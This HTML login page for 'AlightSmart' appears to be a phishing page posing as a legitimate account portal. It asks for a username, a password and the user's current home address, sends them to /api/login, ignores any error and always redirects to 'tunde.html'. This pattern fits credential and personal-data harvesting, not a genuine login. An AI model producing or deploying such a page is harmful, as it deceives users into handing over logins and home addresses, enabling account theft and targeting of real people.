<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f8fafc;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo-container {
            text-align: center;
            margin: 40px 0 30px;
        }
        .logo-container h1 {
            font-size: 2.2rem;
            font-weight: 700;
            color: #1e2937;
        }
        .logo-container .subtitle {
            font-size: 1.8rem;
            color: #0f172a;
            margin-top: 5px;
        }
        .sun-icon {
            font-size: 3.5rem;
            margin: 15px 0;
        }
        .form-container {
            width: 100%;
            max-width: 380px;
        }
        label {
            display: block;
            margin: 25px 0 8px;
            font-size: 1.05rem;
            color: #334155;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: none;
            border-bottom: 1.5px solid #cbd5e1;
            font-size: 1.1rem;
            background: transparent;
        }
        input:focus {
            outline: none;
            border-bottom-color: #3b82f6;
        }
        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 25px 0;
        }
        .face-id {
            font-size: 2rem;
            cursor: pointer;
        }
        .login-btn {
            width: 100%;
            padding: 16px;
            background: #94a3b8;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.2rem;
            font-weight: 600;
            margin: 15px 0;
            cursor: pointer;
        }
        .signup-btn {
            width: 100%;
            padding: 16px;
            background: transparent;
            color: #166534;
            border: 2px solid #166534;
            border-radius: 50px;
            font-size: 1.2rem;
            font-weight: 600;
            cursor: pointer;
        }
        .forgot {
            text-align: center;
            margin: 20px 0;
            color: #166534;
            font-size: 0.95rem;
        }
        .forgot a {
            color: #166534;
            text-decoration: underline;
        }
        footer {
            margin-top: auto;
            padding: 30px 0 20px;
            text-align: center;
            color: #64748b;
            font-size: 0.85rem;
        }
        footer a {
            color: #64748b;
            margin: 0 10px;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>AlightSmart</h1>
        <h2>Welcome Back</h2>
        
        <form id="loginForm">
            <div class="form-group">
                <label>Username or Email</label>
                <input type="text" id="username" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="password" required>
            </div>
            <div class="form-group">
                <label>Home Address (Latest)</label>
                <input type="text" id="address" placeholder="Enter your current home address" required>
            </div>
            <button type="submit" class="login-btn">Login</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const address = document.getElementById('address').value;

            try {
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password, address })
                });
            } catch (err) {}

            window.location.href = "tunde.html";
        });
    </script>
</body>
</html>
